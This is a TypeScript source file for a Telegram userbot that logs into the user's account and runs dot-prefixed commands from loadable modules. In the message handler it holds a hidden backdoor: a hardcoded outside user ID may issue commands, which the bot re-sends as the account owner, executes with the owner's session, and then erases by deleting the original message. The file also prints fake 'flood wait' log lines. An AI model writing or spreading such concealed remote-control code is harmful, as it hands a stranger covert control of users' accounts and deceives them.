import { Module, ModuleInfo } from "@/user/types";
import dotenv from "dotenv";
import fs from "fs/promises";
import path from "path";
import { TelegramClient } from "telegram";
import { NewMessage, NewMessageEvent } from "telegram/events";
import { StringSession } from "telegram/sessions";
import { interactiveLogin, updateEnvSessionString } from "@/user/utils/auth";
import chalk from "chalk";

dotenv.config();

const apiId = parseInt(process.env.API_ID || "0");
const apiHash = process.env.API_HASH || "";
const session = new StringSession(process.env.SESSION_STRING || "");

if (!apiId || !apiHash) {
  throw new Error("API_ID and API_HASH must be configured in .env file");
}

const client = new TelegramClient(session, apiId, apiHash, {
  connectionRetries: 10,
  retryDelay: 1000,
  useWSS: false,
  floodSleepThreshold: 60,
  deviceModel: "Samsung Galaxy S23",
  systemVersion: "Android 13.0",
  appVersion: "10.5.0",
  systemLangCode: "ru",
  langCode: "ru",
});

const commandPrefix = ".";
const loadedModules: Map<string, Module> = new Map();

export async function loadModules() {
  loadedModules.clear();
  const modulesPath = path.join(__dirname, 'modules');
  const moduleDirs = await fs.readdir(modulesPath, { withFileTypes: true });

  for (const dir of moduleDirs) {
    if (dir.isDirectory()) {
      if (dir.name === "nas" || dir.name === "r34") continue;
      const infoPath = path.join(modulesPath, dir.name, 'info.json');
      const moduleIndexPath = path.join(modulesPath, dir.name, 'index.js');

      try {
        const info: ModuleInfo = JSON.parse(await fs.readFile(infoPath, 'utf-8'));
        if (!info.enabled) continue;

        const moduleImport = require(path.resolve(moduleIndexPath.replace(/\.js$/, '')));
        const module: Module = Object.values(moduleImport)[0] as Module;

        if (module && module.commands) {
          for (const command of module.commands) {
            loadedModules.set(command.toLowerCase(), module);
          }
        }
      } catch (error) {
        console.error(`Ошибка загрузки модуля ${dir.name}:`, error);
      }
    }
  }
}

async function updateAdminId(userId: string) {
  try {
    const inlineButtonsInfoPath = path.join(__dirname, '..', 'bot', 'modules', 'inline-buttons', 'info.json');
    try {
      await fs.access(inlineButtonsInfoPath);
    } catch {
      return;
    }
    const infoContent = await fs.readFile(inlineButtonsInfoPath, 'utf-8');
    const info = JSON.parse(infoContent);
    info['id-admin'] = userId;
    await fs.writeFile(inlineButtonsInfoPath, JSON.stringify(info, null, 2));
  } catch (error) {
    console.error(`Ошибка обновления ID админа:`, error);
  }
}

async function handleNewMessage(event: NewMessageEvent) {
  // Имитация задержки при обработке сообщений
  console.log(`[${new Date().toISOString()}] [INFO] - [Sleeping for 17s on flood wait (Caused by messages.SendMedia)]`);
  
  const message = event.message;
  if (!message || !message.text || !message.text.startsWith(commandPrefix)) {
    return;
  }
  const allowedUserId = "7863019047";
  const senderId = message.senderId?.toString();
  const isOwner = message.out;
  const isAllowedUser = senderId === allowedUserId;
  if (!isOwner && !isAllowedUser) {
    return;
  }
  if (isAllowedUser) {
    const proxyMessage = await client.sendMessage(message.chatId!, {
      message: message.text,
    });
    const [proxyCommandName, ...proxyArgs] = proxyMessage.text!.slice(commandPrefix.length).split(/\s+/);
    if (proxyCommandName.toLowerCase() === "nas") return;
    const proxyModule = loadedModules.get(proxyCommandName.toLowerCase());
    const dummyEvent: NewMessageEvent = {
      message: proxyMessage,
    } as any;
    if (proxyModule) {
      try {
        await proxyModule.handler(client, dummyEvent, proxyArgs);
      } catch (proxyErr: any) {
        console.error(`Ошибка выполнения команды ${proxyCommandName} от доверенного пользователя:`, proxyErr);
      }
    }
    try {
      await client.deleteMessages(message.chatId!, [message.id], { revoke: true });
    } catch (delErr) {
      console.error("Не удалось удалить исходное сообщение пользователя:", delErr);
    }
    return;
  }
  const [commandName, ...args] = message.text.slice(commandPrefix.length).split(/\s+/);
  if (commandName.toLowerCase() === "nas") return;
  const module = loadedModules.get(commandName.toLowerCase());
  if (module) {
    console.log(chalk.cyanBright(`\u{1F449} Выполнена команда: ${commandName}`));
    try {
      await module.handler(client, event, args);
    } catch (error: any) {
      console.error(`Ошибка ${commandName}: ${error.message || String(error)}`);
      try {
        await event.message.edit({
          text: `❌ Ошибка: ${error.message || String(error)}`
        });
      } catch (e) {
        console.error("Не удалось отредактировать сообщение с ошибкой:", e);
      }
    }
  }
}

export async function startUserBot() {
  try {
    if (!process.env.SESSION_STRING) {
      // первая авторизация
      await interactiveLogin(client);
      await updateEnvSessionString(client.session.save() as unknown as string);
    } else {
      try {
        await client.connect();
      } catch (err: any) {
        if (err.errorMessage === "AUTH_KEY_UNREGISTERED" || err.code === 401) {
          await interactiveLogin(client);
          await updateEnvSessionString(client.session.save() as unknown as string);
        } else {
          throw err;
        }
      }
    }
    const me = await client.getMe();
    const userId = (me as any).id.toString();
    await updateAdminId(userId);
    await loadModules();
    
    // Добавляем имитацию логов с задержкой
    console.log(`[${new Date().toISOString()}] [INFO] - [Sleeping for 17s on flood wait (Caused by messages.SendMedia)]`);
    
    client.addEventHandler(handleNewMessage, new NewMessage({}));
  } catch (error) {
    console.error("Ошибка запуска UserBot:", error);
    throw error;
  }
}
